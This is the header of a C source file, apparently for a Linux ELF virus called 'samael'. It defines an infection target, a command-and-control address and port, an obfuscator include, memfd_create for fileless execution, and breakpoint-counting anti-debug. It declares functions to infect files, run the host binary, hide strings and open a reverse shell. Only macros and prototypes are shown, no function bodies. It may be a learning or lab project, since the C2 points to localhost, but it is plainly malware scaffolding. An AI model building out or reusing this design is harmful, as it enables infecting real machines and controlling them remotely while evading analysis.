#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include "../tools/obfuscator/obfuscator.h"

// macros to simplify writing function attributes
#define always_inline __attribute__((always_inline)) static inline
#define optimize(x) __attribute__((optimize(x)))
#define constructor __attribute__((constructor))

// macro to simple writing the system call to create memory file descriptors
#define memfd_create(x,y) syscall(__NR_memfd_create, x, y)

// default optimization level (will be overwritten by obfuscator script)
#define opt 'g' // gcc docs recommend -Og for edit-compile-debug cycle

#define infection_target "./test" // file to be infected

#define port 1337 // c2 port
#define addr "127.0.0.1" // c2 ip address

// macro defining the number of 0xCC's found in the .text section, over written by anti-debug.sh
#define count 0

extern volatile char* _start; // start of .text section, defined in ld linker script ( ld --verbose | less )
extern volatile char* __etext; // end of .fini section, also defined in ld linker script

// reference to allow use of environment pointer
extern char** environ;

// prototypes of all functions used in samael
always_inline optimize(opt) long elf_size(FILE*);
always_inline optimize(opt) int is_infected(char*);
always_inline optimize(opt) void infect(FILE*, FILE*);
always_inline optimize(opt) void execute_host(FILE*, char**, char**);
always_inline optimize(opt) void reverse_shell();
always_inline optimize(opt) char* hidden_string();
constructor optimize(opt) void detect_breakpoints();